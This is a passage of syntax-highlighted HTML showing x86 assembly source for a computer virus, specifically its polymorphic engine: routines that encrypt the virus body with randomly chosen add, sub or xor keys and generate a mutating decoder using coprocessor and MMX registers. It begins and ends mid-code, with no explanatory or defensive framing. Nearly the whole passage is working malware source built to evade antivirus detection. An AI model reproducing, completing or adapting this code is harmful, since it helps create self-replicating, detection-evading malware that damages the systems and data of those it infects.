        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_reg2mov</span><span class="sc0">

    </span><span class="sc5">__ppe_gcount_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate encrypted body of this virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_encode_one</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; select style (add/sub/xor)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; generate a code value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value_add</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; preparing...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value_add</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__ppe_eo_coding</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; I must select style of encoding...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_eo_xor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_eo_sub</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_eo_next</span><span class="sc0">
    </span><span class="sc5">__ppe_eo_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_eo_next</span><span class="sc0">
    </span><span class="sc5">__ppe_eo_xor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc5">__ppe_eo_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_eo_coding</span><span class="sc0">

        </span><span class="sc1">; save new values</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; change sub &lt;--&gt; add</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_eo_fsub</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_eo_finish</span><span class="sc0">
    </span><span class="sc5">__ppe_eo_fsub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_eo_finish</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__ppe_eo_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to build poly-decoder ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ppe_dindex_breg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">__ppe_dcode_breg</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_decoder</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; save this place in memory for the future JNZ jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_back</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">;---- INDEX REG ----</span><span class="sc0">
        </span><span class="sc1">; mov index_reg from copro/mmx if it's necessary</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;base ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_dindex_finish</span><span class="sc0">
    </span><span class="sc5">__ppe_dindex_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_dindex_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;copro ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_dindex_copro</span><span class="sc0">

        </span><span class="sc1">; mov mmx-reg &amp; copro-reg to base-empty-reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0102h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_math_extended</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_dindex_finish</span><span class="sc0">
    </span><span class="sc5">__ppe_dindex_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; mov copro-reg to base-empty-reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_mov2reg</span><span class="sc0">
    </span><span class="sc5">__ppe_dindex_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_dindex_breg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">;---- CODE REG ----</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_dcode_breg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">          </span><span class="sc1">;XOR instruction</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_dcrypt_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">          </span><span class="sc1">;SUB instruction</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_dcrypt_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">;ADD instruction</span><span class="sc0">
    </span><span class="sc5">__ppe_dcrypt_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_dcode_breg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_dindex_breg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; enable registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to select new index ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc5">__ppe_gni_random</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ppe_get_next_index</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; add or sub ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gni_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; where I have index store ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gni_mmx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gni_copro</span><span class="sc0">

        </span><span class="sc1">; index_reg is in base-reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gni_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gni_b2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc5">__ppe_gni_b1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gni_finish</span><span class="sc0">
        </span><span class="sc5">__ppe_gni_b2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc0">          </span><span class="sc1">;SUB instruction</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gni_b1_after</span><span class="sc0">

        </span><span class="sc1">; COPRO operation</span><span class="sc0">
    </span><span class="sc5">__ppe_gni_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gni_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gni_c2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

